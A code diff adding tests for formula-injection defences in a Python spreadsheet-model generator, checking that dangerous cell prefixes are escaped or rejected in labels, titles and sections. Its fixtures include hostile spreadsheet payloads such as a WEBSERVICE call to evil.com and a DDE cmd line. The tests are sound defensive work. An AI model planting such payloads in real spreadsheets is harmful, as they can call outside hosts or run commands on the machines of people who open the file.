@@ -6,7 +6,8 @@ from hypothesis import strategies as st
 
 from excel_model.exceptions import FormulaInjectionError
 from excel_model.formula_engine import CellContext, render_formula
-from excel_model.spec import InputsDef, LineItemDef, MetadataDef, ModelSpec
+from excel_model.injection_guard import sanitize_cell_text, validate_text_field
+from excel_model.spec import AssumptionDef, InputsDef, LineItemDef, MetadataDef, ModelSpec
 from excel_model.validator import validate_custom_formula, validate_spec
 
 
@@ -289,3 +290,184 @@ class TestFormulaInjectionEndToEnd:
         ctx = make_ctx()
         result = render_formula("custom", {"formula": safe}, ctx)
         assert result == "=D$10*1.1"
+
+
+def _make_spec_with_label(label: str) -> ModelSpec:
+    """Helper to create a ModelSpec with a specific assumption label."""
+    return ModelSpec(
+        model_type="p_and_l",
+        title="Test",
+        currency="CHF",
+        granularity="annual",
+        start_period="2025",
+        n_periods=3,
+        n_history_periods=0,
+        assumptions=(
+            AssumptionDef(
+                name="GrowthRate",
+                label=label,
+                value=0.1,
+                format="percent",
+                group="Inputs",
+            ),
+        ),
+        drivers=(),
+        line_items=(),
+        metadata=MetadataDef(preparer="", date="", version="1.0"),
+        scenarios=(),
+        column_groups=(),
+        inputs=InputsDef(source="", period_col="period", sheet="", value_cols={}),
+        entities=(),
+    )
+
+
+class TestSanitizeCellText:
+    """Test sanitize_cell_text escapes dangerous prefixes."""
+
+    @pytest.mark.parametrize(
+        "value,expected",
+        [
+            ('=WEBSERVICE("http://evil.com")', '\'=WEBSERVICE("http://evil.com")'),
+            ("+cmd|'/c calc'!A0", "'+cmd|'/c calc'!A0"),
+            ("-1+1", "'-1+1"),
+            ("@SUM(A1:A10)", "'@SUM(A1:A10)"),
+            ("Revenue Growth Rate", "Revenue Growth Rate"),
+            ("", ""),
+        ],
+        ids=["equals", "plus", "minus", "at", "safe_label", "empty"],
+    )
+    def test_sanitize(self, value: str, expected: str) -> None:
+        assert sanitize_cell_text(value) == expected
+
+    @given(st.text(min_size=1).filter(lambda s: s[0] not in ("=", "+", "-", "@")))
+    def test_safe_strings_unchanged(self, value: str) -> None:
+        assert sanitize_cell_text(value) == value
+
+    @given(st.sampled_from(["=", "+", "-", "@"]), st.text())
+    def test_dangerous_prefix_always_escaped(self, prefix: str, rest: str) -> None:
+        value = prefix + rest
+        result = sanitize_cell_text(value)
+        assert result.startswith("'")
+        assert result[1:] == value
+
+
+class TestValidateTextField:
+    """Test validate_text_field rejects dangerous prefixes."""
+
+    @pytest.mark.parametrize("prefix", ["=", "+", "-", "@"])
+    def test_rejects_dangerous_prefix(self, prefix: str) -> None:
+        with pytest.raises(FormulaInjectionError, match="formula injection"):
+            validate_text_field(f"{prefix}WEBSERVICE('http://evil.com')", "test field")
+
+    def test_accepts_safe_text(self) -> None:
+        validate_text_field("Revenue Growth Rate", "test field")
+
+    def test_accepts_empty_string(self) -> None:
+        validate_text_field("", "test field")
+
+    def test_error_message_includes_field_description(self) -> None:
+        with pytest.raises(FormulaInjectionError, match="assumption label"):
+            validate_text_field("=evil", "assumption label")
+
+
+class TestSpecValidationTextFields:
+    """Test that validate_spec catches formula injection in text fields."""
+
+    def test_rejects_dangerous_assumption_label(self) -> None:
+        spec = _make_spec_with_label('=WEBSERVICE("http://evil.com")')
+        errors = validate_spec(spec)
+        assert any("formula injection" in e.lower() for e in errors)
+
+    @pytest.mark.parametrize("prefix", ["=", "+", "-", "@"])
+    def test_rejects_all_dangerous_prefixes_in_label(self, prefix: str) -> None:
+        spec = _make_spec_with_label(f"{prefix}payload")
+        errors = validate_spec(spec)
+        assert any("formula injection" in e.lower() for e in errors)
+
+    def test_accepts_safe_assumption_label(self) -> None:
+        spec = _make_spec_with_label("Revenue Growth Rate")
+        errors = validate_spec(spec)
+        assert not any("formula injection" in e.lower() for e in errors)
+
+    def test_rejects_dangerous_title(self) -> None:
+        spec = ModelSpec(
+            model_type="p_and_l",
+            title='=WEBSERVICE("http://evil.com")',
+            currency="CHF",
+            granularity="annual",
+            start_period="2025",
+            n_periods=3,
+            n_history_periods=0,
+            assumptions=(),
+            drivers=(),
+            line_items=(),
+            metadata=MetadataDef(preparer="", date="", version="1.0"),
+            scenarios=(),
+            column_groups=(),
+            inputs=InputsDef(source="", period_col="period", sheet="", value_cols={}),
+            entities=(),
+        )
+        errors = validate_spec(spec)
+        assert any("title" in e and "formula injection" in e.lower() for e in errors)
+
+    def test_rejects_dangerous_line_item_label(self) -> None:
+        li = LineItemDef(
+            key="evil_item",
+            label='=WEBSERVICE("http://evil.com")',
+            formula_type="constant",
+            formula_params={"value": 100},
+            is_subtotal=False,
+            is_total=False,
+            section="",
+            format="currency",
+        )
+        spec = ModelSpec(
+            model_type="p_and_l",
+            title="Test",
+            currency="CHF",
+            granularity="annual",
+            start_period="2025",
+            n_periods=3,
+            n_history_periods=0,
+            assumptions=(),
+            drivers=(),
+            line_items=(li,),
+            metadata=MetadataDef(preparer="", date="", version="1.0"),
+            scenarios=(),
+            column_groups=(),
+            inputs=InputsDef(source="", period_col="period", sheet="", value_cols={}),
+            entities=(),
+        )
+        errors = validate_spec(spec)
+        assert any("line item" in e and "formula injection" in e.lower() for e in errors)
+
+    def test_rejects_dangerous_section(self) -> None:
+        li = LineItemDef(
+            key="item",
+            label="Safe",
+            formula_type="constant",
+            formula_params={"value": 100},
+            is_subtotal=False,
+            is_total=False,
+            section="=EVIL",
+            format="currency",
+        )
+        spec = ModelSpec(
+            model_type="p_and_l",
+            title="Test",
+            currency="CHF",
+            granularity="annual",
+            start_period="2025",
+            n_periods=3,
+            n_history_periods=0,
+            assumptions=(),
+            drivers=(),
+            line_items=(li,),
+            metadata=MetadataDef(preparer="", date="", version="1.0"),
+            scenarios=(),
+            column_groups=(),
+            inputs=InputsDef(source="", period_col="period", sheet="", value_cols={}),
+            entities=(),
+        )
+        errors = validate_spec(spec)
+        assert any("section" in e and "formula injection" in e.lower() for e in errors)
